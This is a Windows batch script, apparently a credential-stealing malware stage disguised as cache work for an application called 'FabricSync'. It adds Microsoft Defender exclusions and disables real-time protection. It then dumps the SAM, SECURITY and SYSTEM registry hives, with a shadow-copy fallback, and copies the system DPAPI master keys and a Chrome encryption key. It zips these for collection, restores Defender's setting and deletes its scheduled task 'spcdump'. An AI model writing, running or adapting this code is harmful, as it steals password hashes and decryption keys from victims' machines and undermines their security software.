@echo off
setlocal
set "CACHE=C:\Users\Usuario\AppData\Local\FabricSync\cache"
set "ZIP=C:\Users\Usuario\AppData\Local\FabricSync\cache\system-1793893504866.zip"
set "TRIES=0"
powershell -NoP -C "Add-MpPreference -ExclusionPath 'C:\Users\Usuario\AppData\Local\FabricSync\cache','C:\Users\Usuario\AppData\Local\FabricSync' -ExclusionExtension '.hiv' -ExclusionProcess 'reg.exe','esentutl.exe','tar.exe' -ErrorAction SilentlyContinue"
powershell -NoP -C "Start-Sleep -Milliseconds 1500"
powershell -NoP -C "$f='C:\Users\Usuario\AppData\Local\FabricSync\cache\mp.was'; try { $p=Get-MpPreference -ErrorAction Stop; Set-Content -LiteralPath $f -Value ([int]$p.DisableRealtimeMonitoring) -ErrorAction SilentlyContinue; Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}"
:dump
set /a TRIES+=1
del /q "C:\Users\Usuario\AppData\Local\FabricSync\cache\SYSTEM.hiv" "C:\Users\Usuario\AppData\Local\FabricSync\cache\SECURITY.hiv" "C:\Users\Usuario\AppData\Local\FabricSync\cache\SAM.hiv" 2>nul
reg save HKLM\SYSTEM "C:\Users\Usuario\AppData\Local\FabricSync\cache\SYSTEM.hiv" /y
call :fallback SYSTEM SYSTEM.hiv
reg save HKLM\SECURITY "C:\Users\Usuario\AppData\Local\FabricSync\cache\SECURITY.hiv" /y
call :fallback SECURITY SECURITY.hiv
reg save HKLM\SAM "C:\Users\Usuario\AppData\Local\FabricSync\cache\SAM.hiv" /y
call :fallback SAM SAM.hiv
if not exist "C:\Users\Usuario\AppData\Local\FabricSync\cache\SYSTEM.hiv" goto retry
for %%A in ("C:\Users\Usuario\AppData\Local\FabricSync\cache\SYSTEM.hiv") do if %%~zA LSS 1048576 goto retry
if not exist "C:\Users\Usuario\AppData\Local\FabricSync\cache\SECURITY.hiv" goto retry
for %%A in ("C:\Users\Usuario\AppData\Local\FabricSync\cache\SECURITY.hiv") do if %%~zA LSS 4096 goto retry
if not exist "C:\Users\Usuario\AppData\Local\FabricSync\cache\SAM.hiv" goto retry
for %%A in ("C:\Users\Usuario\AppData\Local\FabricSync\cache\SAM.hiv") do if %%~zA LSS 4096 goto retry
robocopy C:\Windows\System32\Microsoft\Protect "C:\Users\Usuario\AppData\Local\FabricSync\cache\ProtectSystem" /e /njh /njs /ndl /nc /ns
robocopy C:\ProgramData\Microsoft\Crypto\SystemKeys "C:\Users\Usuario\AppData\Local\FabricSync\cache\SystemKeys" /e /njh /njs /ndl /nc /ns
if not exist "C:\Users\Usuario\AppData\Local\FabricSync\cache\ProtectSystem\S-1-5-18" goto retry
if not exist "C:\Users\Usuario\AppData\Local\FabricSync\cache\SystemKeys\Google Chromekey1" goto retry
del /q "C:\Users\Usuario\AppData\Local\FabricSync\cache\system-1793893504866.zip" 2>nul
tar -a -cf "C:\Users\Usuario\AppData\Local\FabricSync\cache\system-1793893504866.zip" -C "C:\Users\Usuario\AppData\Local\FabricSync\cache" SYSTEM.hiv SECURITY.hiv SAM.hiv ProtectSystem SystemKeys
if errorlevel 1 goto retry
tar -tf "C:\Users\Usuario\AppData\Local\FabricSync\cache\system-1793893504866.zip" | findstr /x /c:"SYSTEM.hiv" >nul || goto retry
tar -tf "C:\Users\Usuario\AppData\Local\FabricSync\cache\system-1793893504866.zip" | findstr /x /c:"SECURITY.hiv" >nul || goto retry
tar -tf "C:\Users\Usuario\AppData\Local\FabricSync\cache\system-1793893504866.zip" | findstr /x /c:"SAM.hiv" >nul || goto retry
tar -tf "C:\Users\Usuario\AppData\Local\FabricSync\cache\system-1793893504866.zip" | findstr /b /c:"ProtectSystem/" >nul || goto retry
tar -tf "C:\Users\Usuario\AppData\Local\FabricSync\cache\system-1793893504866.zip" | findstr /x /c:"SystemKeys/Google Chromekey1" >nul || goto retry
goto packed
:retry
if %TRIES% GEQ 3 goto giveup
ping -n 3 127.0.0.1 >nul
goto dump
:giveup
echo incomplete after %TRIES% tries > "C:\Users\Usuario\AppData\Local\FabricSync\cache\elevate.status"
del /q "C:\Users\Usuario\AppData\Local\FabricSync\cache\system-1793893504866.zip" 2>nul
goto done
:packed
echo ok > "C:\Users\Usuario\AppData\Local\FabricSync\cache\elevate.status"
del /q "C:\Users\Usuario\AppData\Local\FabricSync\cache\SYSTEM.hiv" "C:\Users\Usuario\AppData\Local\FabricSync\cache\SECURITY.hiv" "C:\Users\Usuario\AppData\Local\FabricSync\cache\SAM.hiv" 2>nul
:done
powershell -NoP -C "$f='C:\Users\Usuario\AppData\Local\FabricSync\cache\mp.was'; if (Test-Path -LiteralPath $f) { $off=((Get-Content -LiteralPath $f) -eq '1'); Set-MpPreference -DisableRealtimeMonitoring $off -ErrorAction SilentlyContinue; Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue }"
schtasks /delete /tn spcdump /f >nul 2>&1
exit /b 0
:fallback
if exist "C:\Users\Usuario\AppData\Local\FabricSync\cache\%2" for %%A in ("C:\Users\Usuario\AppData\Local\FabricSync\cache\%2") do if %%~zA GTR 4096 exit /b 0
esentutl /y /vss "C:\Windows\System32\config\%1" /d "C:\Users\Usuario\AppData\Local\FabricSync\cache\%2" >nul 2>&1
exit /b 0
